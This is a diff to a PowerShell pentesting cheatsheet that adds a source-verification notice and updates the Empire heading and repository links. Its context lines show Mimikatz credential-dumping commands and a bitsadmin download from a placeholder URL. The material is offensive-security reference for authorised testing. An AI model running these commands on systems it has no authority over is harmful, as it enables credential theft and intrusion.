@@ -1,5 +1,7 @@
 # 💻 PowerShell - Complete Pentesting Cheatsheet
 
+> **Review status:** Source verification pending. Confirm version-sensitive commands against the official documentation before use.
+
 ```
   ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
   ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     
@@ -855,7 +857,7 @@ Invoke-Mimikatz -DumpCreds
 Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
 ```
 
-### Empire/PowerShell Empire
+### BC Security Empire
 
 ```powershell
 # Stager execution (from Empire)
@@ -948,7 +950,8 @@ bitsadmin /transfer job /download /priority high http://url/file C:\file
 
 - [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
 - [Nishang](https://github.com/samratashok/nishang)
-- [PowerShell Empire](https://github.com/EmpireProject/Empire)
+- [BC Security Empire](https://github.com/BC-SECURITY/Empire)
+- [Legacy EmpireProject archive](https://github.com/EmpireProject/Empire)
 - [LOLBAS](https://lolbas-project.github.io/)
 - [HackTricks PowerShell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)
 
